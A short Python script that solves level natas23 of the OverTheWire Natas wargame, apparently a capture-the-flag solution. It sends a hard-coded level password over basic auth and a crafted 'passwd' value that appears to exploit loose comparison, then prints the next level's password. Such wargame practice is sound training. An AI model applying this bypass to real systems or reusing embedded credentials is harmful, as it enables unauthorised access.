import requests
from requests.auth import HTTPBasicAuth 

def get_pass():
    auth = HTTPBasicAuth('natas23','D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE')
    param = {'passwd':'20iloveyou'}
    r = requests.get('http://natas23.natas.labs.overthewire.org/', auth=auth, params=param)
    index = r.text.find('Password: ') + 10
    print(r.text[index:index+32])
if __name__ == '__main__':
    get_pass()
